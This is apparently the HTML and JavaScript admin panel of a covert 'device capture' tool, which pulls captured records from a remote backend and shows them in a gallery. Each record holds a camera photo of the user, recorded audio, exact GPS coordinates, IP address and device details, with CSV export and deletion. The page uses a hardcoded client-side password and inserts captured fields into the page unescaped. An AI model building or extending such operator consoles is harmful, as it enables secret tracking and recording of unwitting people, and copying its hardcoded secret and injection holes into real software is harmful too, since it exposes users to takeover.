<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 ADMIN · device capture</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, monospace;
            background: #0b0d10;
            color: #e0f2fe;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
        }
        .container {
            max-width: 1400px;
            width: 100%;
        }

        /* login */
        .login-box {
            background: #14181c;
            border: 1px solid #2a3a44;
            border-radius: 32px;
            padding: 40px 32px;
            max-width: 380px;
            margin: 80px auto;
            box-shadow: 0 20px 40px -12px rgba(0,0,0,0.8);
            backdrop-filter: blur(2px);
            text-align: center;
        }
        .login-box h2 {
            font-weight: 500;
            letter-spacing: 2px;
            font-size: 24px;
            color: #8ab4f8;
            margin-bottom: 24px;
        }
        .login-box input {
            width: 100%;
            padding: 14px 18px;
            margin: 12px 0;
            background: #1e262e;
            border: 1px solid #2e404c;
            border-radius: 60px;
            color: #f0f9ff;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }
        .login-box input:focus {
            border-color: #4b7cf7;
            box-shadow: 0 0 0 3px rgba(75, 124, 247, 0.2);
        }
        .login-box button {
            width: 100%;
            padding: 14px;
            background: #4b7cf7;
            border: none;
            border-radius: 60px;
            color: white;
            font-weight: 600;
            font-size: 16px;
            letter-spacing: 0.5px;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 8px;
        }
        .login-box button:hover {
            background: #5f8cfa;
            transform: scale(0.98);
        }
        .login-box .error {
            color: #f87171;
            margin-top: 16px;
            font-size: 14px;
            min-height: 24px;
        }

        /* gallery */
        .gallery {
            display: none;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 18px;
            margin-bottom: 30px;
            border-bottom: 1px solid #26323d;
            padding-bottom: 18px;
        }
        header h2 {
            font-weight: 500;
            font-size: 26px;
            color: #b6d4ff;
            letter-spacing: -0.3px;
        }
        .stats {
            color: #94a3b8;
            font-size: 15px;
        }
        .stats span {
            color: #b6d4ff;
            font-weight: 600;
            font-size: 26px;
            margin-left: 6px;
        }
        .header-buttons {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }
        .header-buttons button {
            padding: 8px 20px;
            background: transparent;
            border: 1px solid #3a4e5e;
            border-radius: 40px;
            color: #d1e5ff;
            font-weight: 500;
            font-size: 13px;
            cursor: pointer;
            transition: 0.2s;
            letter-spacing: 0.3px;
        }
        .header-buttons button:hover {
            background: #1e2e3a;
            border-color: #6b8cff;
        }
        .header-buttons .logout {
            border-color: #6b3a4a;
            color: #fba6b6;
        }
        .header-buttons .logout:hover {
            background: #3a1e28;
            border-color: #f87171;
        }

        /* grid */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
            gap: 24px;
        }

        .card {
            background: #131a20;
            border: 1px solid #26323d;
            border-radius: 24px;
            overflow: hidden;
            transition: 0.25s ease;
            box-shadow: 0 8px 20px -8px rgba(0,0,0,0.6);
        }
        .card:hover {
            border-color: #4a6a7a;
            box-shadow: 0 12px 28px -10px #0a1a2a;
        }

        .img-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            min-height: 160px;
            background: #0d1217;
        }
        .img-grid img {
            width: 100%;
            height: 100%;
            min-height: 150px;
            object-fit: cover;
            cursor: pointer;
            background: #0b1015;
            border-right: 1px solid #1f2d36;
        }
        .img-grid .device-badge {
            padding: 14px 12px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            background: #0f171e;
            gap: 4px;
            font-size: 12px;
            line-height: 1.5;
            color: #b0c9e0;
        }
        .device-badge .label {
            color: #6f8da0;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.6px;
            margin-bottom: 6px;
            font-weight: 500;
        }
        .device-badge .row {
            display: flex;
            align-items: baseline;
            gap: 6px;
        }
        .device-badge .row i {
            opacity: 0.6;
            width: 18px;
        }
        .device-badge .row span {
            color: #d6ecff;
            font-weight: 400;
            word-break: break-word;
        }
        .device-badge .row .value {
            color: #b6d4ff;
            font-weight: 500;
        }

        .info {
            padding: 16px 14px 14px;
            background: #111a22;
        }

        .detail-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px 12px;
            font-size: 12px;
            color: #b0c9e0;
            margin-bottom: 12px;
        }
        .detail-grid .item {
            display: flex;
            align-items: center;
            gap: 6px;
            border-bottom: 1px solid #1c2a34;
            padding-bottom: 4px;
        }
        .detail-grid .item .emoji {
            opacity: 0.7;
            width: 18px;
        }
        .detail-grid .item .val {
            color: #e2f0ff;
            font-weight: 450;
        }

        .timestamp {
            font-size: 11px;
            color: #4d687a;
            margin: 8px 0 10px;
            letter-spacing: 0.3px;
        }

        .audio-player {
            margin: 12px 0 10px;
            background: #0d151c;
            border-radius: 40px;
            padding: 2px 6px;
        }
        .audio-player audio {
            width: 100%;
            height: 34px;
            border-radius: 40px;
            outline: none;
        }

        .card-actions {
            display: flex;
            gap: 12px;
            margin-top: 4px;
        }
        .delete-btn {
            padding: 6px 18px;
            background: #3d1f2a;
            border: none;
            border-radius: 40px;
            color: #fba6b6;
            font-weight: 500;
            font-size: 12px;
            cursor: pointer;
            transition: 0.15s;
            letter-spacing: 0.3px;
        }
        .delete-btn:hover {
            background: #5f2a3a;
            color: #ffb3c6;
        }

        .loading, .no-data {
            grid-column: 1 / -1;
            text-align: center;
            padding: 60px 20px;
            color: #6b8da0;
            font-size: 18px;
            background: #111a22;
            border-radius: 40px;
            border: 1px dashed #2a3f4a;
        }

        /* lightbox */
        .lightbox {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(2, 6, 12, 0.94);
            backdrop-filter: blur(6px);
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 30px;
        }
        .lightbox img {
            max-width: 92%;
            max-height: 88%;
            border-radius: 20px;
            border: 1px solid #2e4a5a;
            box-shadow: 0 30px 60px #00000080;
            object-fit: contain;
        }
        .lightbox .close {
            position: absolute;
            top: 28px;
            right: 40px;
            color: #b6d4ff;
            font-size: 44px;
            cursor: pointer;
            opacity: 0.7;
            transition: 0.2s;
            line-height: 1;
        }
        .lightbox .close:hover {
            opacity: 1;
            transform: scale(1.05);
        }

        /* responsive */
        @media (max-width: 600px) {
            body { padding: 12px; }
            .login-box { margin: 40px auto; padding: 30px 20px; }
            .grid { grid-template-columns: 1fr; }
            .img-grid { grid-template-columns: 1fr 1fr; min-height: 140px; }
            .img-grid img { min-height: 120px; }
        }
    </style>
</head>
<body>
<div class="container">

    <!-- lightbox -->
    <div class="lightbox" id="lightbox" onclick="closeLightbox()">
        <span class="close" onclick="event.stopPropagation(); closeLightbox()">✕</span>
        <img id="lightboxImg" src="" alt="preview" />
    </div>

    <!-- login -->
    <div class="login-box" id="loginBox">
        <h2>🔐 ADMIN</h2>
        <input type="password" id="passwordInput" placeholder="enter password" autofocus />
        <button onclick="login()">UNLOCK</button>
        <div class="error" id="loginError"></div>
    </div>

    <!-- gallery -->
    <div class="gallery" id="gallery">
        <header>
            <div>
                <h2>📡 CAPTURES</h2>
                <div class="stats">TOTAL <span id="total">0</span></div>
            </div>
            <div class="header-buttons">
                <button onclick="exportCSV()">📊 CSV</button>
                <button onclick="loadData()">🔄 REFRESH</button>
                <button class="logout" onclick="logout()">🚪 EXIT</button>
            </div>
        </header>
        <div class="grid" id="grid"></div>
    </div>
</div>

<script>
    (function() {
        const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
        const PASSWORD = 'admin123#@!';

        // DOM refs
        const loginBox = document.getElementById('loginBox');
        const gallery = document.getElementById('gallery');
        const passwordInput = document.getElementById('passwordInput');
        const loginError = document.getElementById('loginError');
        const grid = document.getElementById('grid');
        const totalSpan = document.getElementById('total');
        const lightbox = document.getElementById('lightbox');
        const lightboxImg = document.getElementById('lightboxImg');

        // ---------- helpers ----------
        function closeLightbox() {
            lightbox.style.display = 'none';
        }
        window.closeLightbox = closeLightbox;

        function openLightbox(src) {
            if (!src || src === '#') return;
            lightboxImg.src = src;
            lightbox.style.display = 'flex';
        }
        window.openLightbox = openLightbox;

        // ---------- login ----------
        window.login = function() {
            const pwd = passwordInput.value.trim();
            if (pwd === PASSWORD) {
                loginBox.style.display = 'none';
                gallery.style.display = 'block';
                loginError.textContent = '';
                loadData();
            } else {
                loginError.textContent = '⛔ ACCESS DENIED';
                passwordInput.value = '';
                passwordInput.focus();
            }
        };

        window.logout = function() {
            loginBox.style.display = 'block';
            gallery.style.display = 'none';
            passwordInput.value = '';
            loginError.textContent = '';
            grid.innerHTML = '';
            totalSpan.textContent = '0';
        };

        window.exportCSV = function() {
            window.open(BACKEND_URL + '/api/export-csv', '_blank');
        };

        // ---------- load data ----------
        window.loadData = async function() {
            grid.innerHTML = '<div class="loading">⏳ loading captures…</div>';
            try {
                const res = await fetch(BACKEND_URL + '/api/admin/get-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password: PASSWORD })
                });
                if (!res.ok) throw new Error('HTTP ' + res.status);
                const data = await res.json();
                if (!data.success) {
                    grid.innerHTML = `<div class="no-data">⛔ ${data.message || 'error'}</div>`;
                    return;
                }
                totalSpan.textContent = data.count || 0;
                const items = data.data || [];
                if (items.length === 0) {
                    grid.innerHTML = '<div class="no-data">📭 no captures yet</div>';
                    return;
                }

                grid.innerHTML = '';
                items.forEach(item => {
                    const device = item.fullDeviceInfo || item.deviceDetails || {};
                    const loc = item.location || {};
                    const card = document.createElement('div');
                    card.className = 'card';

                    // photo
                    const photoSrc = item.userPhoto || item.cameraImage || '#';

                    // audio
                    let audioHtml = '';
                    if (item.audioData && item.audioData !== 'null' && item.audioData.length > 20) {
                        audioHtml = `<div class="audio-player"><audio controls><source src="${item.audioData}" type="audio/webm"></audio></div>`;
                    }

                    // device badge (left side of image grid)
                    const badge = `
                        <div class="device-badge">
                            <div class="label">📱 device</div>
                            <div class="row"><i>📱</i> <span class="value">${device.deviceName || '—'}</span></div>
                            <div class="row"><i>📟</i> <span class="value">${device.deviceModel || '—'}</span></div>
                            <div class="row"><i>🏭</i> <span class="value">${device.manufacturer || '—'}</span></div>
                            <div class="row"><i>📲</i> <span class="value">${device.os || '—'} ${device.osVersion || ''}</span></div>
                        </div>
                    `;

                    // detail grid (right side)
                    const details = `
                        <div class="detail-grid">
                            <div class="item"><span class="emoji">📍</span> <span class="val">${loc.lat?.toFixed(5) || '—'}</span></div>
                            <div class="item"><span class="emoji">📍</span> <span class="val">${loc.lng?.toFixed(5) || '—'}</span></div>
                            <div class="item"><span class="emoji">🎯</span> <span class="val">${loc.accuracy || '—'}m</span></div>
                            <div class="item"><span class="emoji">📡</span> <span class="val">${item.ipAddress || '—'}</span></div>
                            <div class="item"><span class="emoji">🔋</span> <span class="val">${device.battery?.level || '—'}</span></div>
                            <div class="item"><span class="emoji">📶</span> <span class="val">${device.connection?.type || '—'}</span></div>
                            <div class="item"><span class="emoji">🖥️</span> <span class="val">${device.screen?.width || '—'}×${device.screen?.height || '—'}</span></div>
                            <div class="item"><span class="emoji">🧠</span> <span class="val">${device.memory || '—'}GB</span></div>
                            <div class="item"><span class="emoji">⚡</span> <span class="val">${device.cores || '—'}</span></div>
                            <div class="item"><span class="emoji">🌐</span> <span class="val">${device.language || '—'}</span></div>
                            <div class="item"><span class="emoji">🕒</span> <span class="val">${device.timezone || '—'}</span></div>
                            <div class="item"><span class="emoji">📱</span> <span class="val">${device.os || '—'}</span></div>
                        </div>
                    `;

                    const timestamp = item.timestamp ? new Date(item.timestamp).toLocaleString('en-IN', { hour12: true }) : '—';

                    card.innerHTML = `
                        <div class="img-grid">
                            <img src="${photoSrc}" onclick="openLightbox('${photoSrc}')" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><rect fill=%22%23121f2a%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2258%22 text-anchor=%22middle%22 fill=%22%236b8da0%22 font-size=%2232%22>📸</text></svg>'" />
                            ${badge}
                        </div>
                        <div class="info">
                            ${details}
                            <div class="timestamp">🕐 ${timestamp}</div>
                            ${audioHtml}
                            <div class="card-actions">
                                <button class="delete-btn" onclick="deleteData('${item._id}')">🗑️ DELETE</button>
                            </div>
                        </div>
                    `;
                    grid.appendChild(card);
                });
            } catch (err) {
                console.error(err);
                grid.innerHTML = `<div class="no-data">❌ ${err.message || 'network error'}</div>`;
            }
        };

        // ---------- delete ----------
        window.deleteData = async function(id) {
            if (!id || !confirm('DELETE this capture?')) return;
            try {
                const res = await fetch(BACKEND_URL + '/api/admin/delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password: PASSWORD, id })
                });
                const data = await res.json();
                if (data.success) {
                    loadData();
                } else {
                    alert('Error: ' + (data.message || 'unknown'));
                }
            } catch (err) {
                alert('Error: ' + err.message);
            }
        };

        // enter key
        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') window.login();
        });

        // close lightbox on escape
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeLightbox();
        });

        console.log('🔐 ADMIN UI · backend:', BACKEND_URL);
    })();
</script>
</body>
</html>
